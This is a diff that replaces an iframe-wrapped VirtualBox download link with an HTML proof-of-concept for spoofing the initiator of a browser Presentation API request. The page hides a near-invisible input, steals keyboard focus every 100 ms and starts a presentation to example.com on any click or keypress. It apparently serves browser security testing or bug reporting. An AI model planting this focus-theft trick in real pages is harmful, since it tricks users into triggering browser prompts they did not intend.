@@ -1,14 +1,30 @@
-<iframe
-  style="width:400px;height:120px;border:1px solid #ccc;"
-  srcdoc='
 <!doctype html>
 <html>
-<body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
-<a href="https://download.virtualbox.org/virtualbox/7.0.8/VirtualBox-7.0.8-156879-Win.exe"
-   target="_blank"
-   style="padding:12px 20px;background:#007aff;color:#fff;text-decoration:none;border-radius:8px;">
-Download VirtualBox
-</a>
+<head>
+<style>
+html { font-family: sans-serif; }
+#focusElem { opacity: 0.00001; width:1px; height:1px; }
+</style>
+</head>
+<body>
+<h1>PoC: Presentation initiator spoof, iframe</h1>
+<p>Click within iframe (or press any key) to run PoC</p>
+<p>iframe on <span id="originOutput"></span></p>
+<input id="focusElem">
+<script>
+originOutput.innerText = window.location.origin;
+
+var runPoC = () => {
+  var presentationRequest = new PresentationRequest(['https://example.com']);
+  presentationRequest.start();
+}
+window.addEventListener('click', runPoC);
+
+// Focus theft described in https://crbug.com/622714
+setInterval(() => {
+  focusElem.focus();
+}, 100);
+focusElem.addEventListener('keypress', runPoC);
+</script>
 </body>
-</html>'>
-</iframe>
+</html>
